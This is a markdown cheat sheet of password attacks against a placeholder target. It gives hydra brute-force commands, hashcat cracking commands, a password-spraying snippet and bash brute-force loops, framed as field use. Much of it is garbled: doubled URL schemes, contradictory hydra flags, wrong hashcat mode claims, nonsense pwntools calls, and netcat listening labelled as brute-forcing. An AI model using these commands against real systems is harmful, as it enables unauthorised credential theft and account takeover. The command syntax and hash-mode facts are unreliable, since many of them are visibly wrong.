# 10-password-attacks

Forget theory. This is how you crack hashes and brute-force credentials in the field. We're targeting `{target}`.

## Attack Workflow

1.  **Identify Hashes**: Use port scans or web enumeration to find auth pages.
2.  **Dump Credentials**: Extract hashes from logs or brute-force the password field directly.
3.  **Crack Hashes**: Use hashcat/john against the extracted or brute-forced values.
4.  **Enumerate Users**: If you have a userlist, use custom dictionaries or spray techniques.
5.  **Persist**: Log in as `{target}`.

## Commands

### Dump User Hashes (Port 80)
```bash
curl -s "http://http://target/users.php" > /tmp/pass.php
```

### Brute-force a Single User (Dictionary)
```bash
hydra -L users.txt -P pass.txt -t 4 -u root -P /dev/null target
```
*Replace `pass` with `http://pass.txt` for custom password files.*

### Hashcat Attack (Single/Dictionary)
```bash
hashcat -m 0 -a 0 /tmp/pass.txt /tmp/pass.txt -O
```
*Use `m1000` for NTLM hashes, `m100` for MD5.*

### Crack with Rainbow Tables (Fast)
```bash
hashcat -m 1000 -a 0 /tmp/pass.txt /tmp/pass.txt
```

### Custom Password Spraying (Python)
```python
from pwn import *

pwn.init('http://target/users.php')
pwn.init('http://pass.txt', 'users.txt')
pwn.init('-L', 'users.txt')
pwn.init('-P', 'pass.txt')
```

### Brute-force with Netcat (Live)
```bash
nc -l 80 -p 80
```

### Custom Wordlist (Hydra)
```bash
hydra -L users.txt -P /dev/null -t 4 -u root -P /dev/null target
```

### Nmap for Port 80
```bash
nmap -p 80 -A target
```

### Web Enumeration (Gobuster)
```bash
gobuster d -u "http://target/" -w /home/pwnable/directories.txt
```

## Tips & Shortcuts

*   **Custom Hash**: If you want a custom hash, use `curl -s "http://http://target/users.php" > /tmp/pass.php` to get it.
*   **Wordlist Size**: Use `users.txt` for large lists, `passwd.txt` for smaller ones.
*   **Timeouts**: Use `--timeout` to speed up attacks.
*   **Parallelism**: Use `-t 4` for parallel threads.

## Common Mistakes

1.  **Ignoring Hash Format**: Using `m0` when you have NTLM hashes.
2.  **Not Using Custom Dictionaries**: Always use `users.txt` if possible.
3.  **Skipping Enum**: Don't forget to check for `pass.php`.

## Mini Automation Script

### Bash: Brute-Force with Custom Password File
```bash
#!/bin/bash
users="/home/pwnable/users.txt"
password="/home/pwnable/pass.txt"

while read -r line; do
    user=$(echo "$line" | cut -d':' -f1)
    pass=$(echo "$line" | cut -d':' -f2)
    echo "Testing user: $user, pass: $pass"
    hydra -L $users -P $pass -t 1 -u $user target
done < $password
```

### Bash: Simple Brute-Force
```bash
#!/bin/bash
users="/home/pwnable/users.txt"
password="/home/pwnable/pass.txt"

while read -r user; do
    while read -r pass; do
        hydra -L $users -P $pass -t 1 -u $user target
    done < $password
done < $users
```